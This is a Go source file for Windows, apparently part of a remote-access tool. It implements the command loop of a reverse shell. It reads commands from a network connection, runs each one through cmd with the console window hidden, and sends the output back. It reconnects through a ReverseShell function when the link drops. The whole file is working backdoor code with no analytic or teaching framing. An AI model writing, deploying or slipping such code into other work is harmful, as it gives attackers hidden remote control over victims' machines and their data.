// +build windows
package main

import (
	"net"
	"bufio"
	"syscall"
	"os/exec"
)

func Shell(conn net.Conn, config Config){
	reader := bufio.NewReader(conn)
	for {
		order, err := reader.ReadString('\n')
		if nil != err {
			conn.Close()
			ReverseShell(config)
			return
		}
	
		cmd := exec.Command("cmd", "/C", order)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()
	
		conn.Write(out)
	}
}